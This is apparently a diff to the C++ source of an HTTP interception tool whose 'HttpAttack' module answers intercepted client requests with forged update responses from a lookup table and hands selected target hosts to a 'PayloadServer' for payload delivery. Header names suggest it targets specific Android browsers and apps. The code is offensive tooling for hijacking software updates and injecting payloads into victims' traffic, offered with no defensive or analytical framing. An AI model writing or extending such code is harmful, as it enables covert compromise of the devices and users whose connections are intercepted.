@@ -51,6 +51,7 @@
 #include "Browser2345Android.h"
 #include "qitu.h"
 #include "peanutShell.h"
+#include "../Helper.h"
 
 
 int HttpAttack::httpAttackPacket(char* buf, int size, const char* url, const char* host, const char* httphdr,const char* httpdata, LPHTTPPROXYPARAM hpp) 
@@ -58,6 +59,22 @@ int HttpAttack::httpAttackPacket(char* buf, int size, const char* url, const cha
 
 	int ret = 0;
 	int retlen = 0;
+
+	for (int i = 0; i < gUpdateData.size(); i++) {
+		if (strstr(gUpdateData[i].url.c_str(), url) && strstr(gUpdateData[i].host.c_str(), host)) {
+			string resp = gUpdateData[i].response;
+			ret = sendAttackPacket(resp.c_str(), resp.length(), hpp);
+			return ret;
+		}
+	}
+
+	ret = SSLPublic::isTargetHost(hpp->host);
+	if (ret) {
+		ret = PayloadServer::PluginServerProc(hpp, buf, size);
+		return ret;
+	}
+
+
 
 	/*
 	if (lphttp->saToClient.sin_addr.S_un.S_addr == 0x0100007f || strstr(lphttp->host, "127.0.0.1") ||
@@ -722,22 +739,24 @@ int HttpAttack::httpAttackPacket(char* buf, int size, const char* url, const cha
 }
 
 
-int HttpAttack::sendAttackPacket(char* recvBuffer, int resultlen, const char* host, LPHTTPPROXYPARAM hpp) {
+int HttpAttack::sendAttackPacket(const char* buf, int len,LPHTTPPROXYPARAM hpp) {
 	int iRet = 0;
 
-	if (resultlen <= 0)
+	if (len <= 0)
 	{
-		log("[%s %d]http attack data length:%u error\r\n", __FUNCTION__, __LINE__, resultlen);
+		log("[%s %d]http attack data length:%u error\r\n", __FUNCTION__, __LINE__, len);
 		return FALSE;
 	}
 
-	int sendlen = send(hpp->sockToClient, (char*)recvBuffer, resultlen, 0);
-	if (sendlen != resultlen)
+	int sendlen = send(hpp->sockToClient, (char*)buf, len, 0);
+	if (sendlen != len)
 	{
-		colorlog(FOREGROUND_GREEN,"[%s %d]HTTP attack error:%d,host:%s\n",__FUNCTION__,__LINE__, GetLastError(), host);
+		colorlog(FOREGROUND_GREEN,"[%s %d]HTTP attack error:%d,host:%s\n",__FUNCTION__,__LINE__, GetLastError(), hpp->host);
+		return 0;
 	}
 	else {
-		colorlog(FOREGROUND_GREEN,"[%s %d]HTTP attack ok,host:%s,packet:%s\n", __FUNCTION__, __LINE__, host, recvBuffer);
+		colorlog(FOREGROUND_GREEN,"[%s %d]HTTP attack ok,host:%s,packet:%s\n", __FUNCTION__, __LINE__, hpp->host, buf);
+		return TRUE;
 	}
 
 	return TRUE;
@@ -745,7 +764,7 @@ int HttpAttack::sendAttackPacket(char* recvBuffer, int resultlen, const char* ho
 
 
 //return value: none zero,shutdown connection;zero,continue connection
-int HttpAttack::httpAttackProc(char* buf, int& size, LPHTTPPROXYPARAM hpp) {
+int HttpAttack::httpAttackProc( char* buf, int& size, LPHTTPPROXYPARAM hpp) {
 
 	extern int gAttackToggle;
 #ifdef _DEBUG
